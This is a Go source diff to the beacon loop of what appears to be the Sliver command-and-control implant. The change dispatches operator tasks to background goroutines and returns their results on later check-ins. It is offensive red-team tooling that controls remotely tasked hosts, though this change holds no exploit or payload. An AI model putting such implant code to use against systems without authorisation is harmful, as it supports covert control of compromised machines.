@@ -251,17 +251,19 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	time.Sleep(time.Second)
 	beacon.Close()
 
-	// BeaconMain - Is executed in it's own goroutine as the function will block
-	// until all tasks complete (in success or failure), if a task handler blocks
-	// forever it will simply block this set of tasks instead of the entire beacon
+	// BeaconMain - Tasks run in background goroutines, check-ins happen on schedule
+	// Results are collected and sent on subsequent check-ins
+	pendingResults := make(chan *sliverpb.Envelope, 100)
 	errors := make(chan error)
 	shortCircuit := make(chan struct{})
+
 	for {
 		duration := beacon.Duration()
 		nextCheckin = time.Now().Add(duration)
+
 		go func() {
 			oldInterval := beacon.Interval()
-			err := beaconMain(beacon, nextCheckin)
+			err := beaconMain(beacon, nextCheckin, pendingResults)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] main error: %v", nextCheckin)
@@ -289,7 +291,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	return nil
 }
 
-func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
+func beaconMain(beacon *transports.Beacon, nextCheckin time.Time, pendingResults chan *sliverpb.Envelope) error {
 	err := beacon.Start()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -304,12 +306,26 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		time.Sleep(time.Second)
 		beacon.Close()
 	}()
+
+	// Collect any pending results from background tasks
+	var completedResults []*sliverpb.Envelope
+collecting:
+	for {
+		select {
+		case result := <-pendingResults:
+			completedResults = append(completedResults, result)
+		default:
+			break collecting
+		}
+	}
+
 	// {{if .Config.Debug}}
-	log.Printf("[beacon] sending check in ...")
+	log.Printf("[beacon] sending check in with %d pending results...", len(completedResults))
 	// {{end}}
 	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:          InstanceID,
 		NextCheckin: int64(beacon.Duration().Seconds()),
+		Tasks:       completedResults,
 	}))
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -361,28 +377,79 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		}
 	}
 
-	// ensure extensions are registered before they are called
-	var results []*sliverpb.Envelope
+	// Dispatch tasks to background - results sent to pendingResults as each completes
+	// Extensions must be registered synchronously before other tasks can use them
 	for _, r := range beaconHandleTasklist(tasksExtensionRegister) {
-		results = append(results, r)
-	}
-	for _, r := range beaconHandleTasklist(tasksOther) {
-		results = append(results, r)
+		pendingResults <- r
 	}
 
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
-		ID:    InstanceID,
-		Tasks: results,
-	}))
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[beacon] error sending results %s", err)
-		// {{end}}
-	}
+	// Dispatch other tasks individually - each sends its result when done
+	beaconDispatchTasks(tasksOther, pendingResults)
+
 	// {{if .Config.Debug}}
-	log.Printf("[beacon] all results sent to server, cleanup ...")
+	log.Printf("[beacon] tasks dispatched to background, check-in complete")
 	// {{end}}
 	return nil
+}
+
+// beaconDispatchTasks dispatches tasks to run in background, sending results as each completes
+func beaconDispatchTasks(tasks []*sliverpb.Envelope, pendingResults chan *sliverpb.Envelope) {
+	sysHandlers := handlers.GetSystemHandlers()
+	specHandlers := handlers.GetKillHandlers()
+
+	for _, task := range tasks {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] dispatching task %d", task.Type)
+		// {{end}}
+		if handler, ok := sysHandlers[task.Type]; ok {
+			data := task.Data
+			taskID := task.ID
+			// {{if eq .Config.GOOS "windows" }}
+			go func() {
+				handlers.WrapperHandler(handler, data, func(data []byte, err error) {
+					// {{if .Config.Debug}}
+					if err != nil {
+						log.Printf("[beacon] handler function returned an error: %s", err)
+					}
+					log.Printf("[beacon] task completed (id: %d)", taskID)
+					// {{end}}
+					pendingResults <- &sliverpb.Envelope{
+						ID:   taskID,
+						Data: data,
+					}
+				})
+			}()
+			//  {{else}}
+			go func() {
+				handler(data, func(data []byte, err error) {
+					// {{if .Config.Debug}}
+					if err != nil {
+						log.Printf("[beacon] handler function returned an error: %s", err)
+					}
+					log.Printf("[beacon] task completed (id: %d)", taskID)
+					// {{end}}
+					pendingResults <- &sliverpb.Envelope{
+						ID:   taskID,
+						Data: data,
+					}
+				})
+			}()
+			// {{end}}
+		} else if task.Type == sliverpb.MsgOpenSession {
+			go openSessionHandler(task.Data)
+			pendingResults <- &sliverpb.Envelope{
+				ID:   task.ID,
+				Data: []byte{},
+			}
+		} else if handler, ok := specHandlers[task.Type]; ok {
+			go handler(task.Data, nil)
+		} else {
+			pendingResults <- &sliverpb.Envelope{
+				ID:                 task.ID,
+				UnknownMessageType: true,
+			}
+		}
+	}
 }
 
 func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
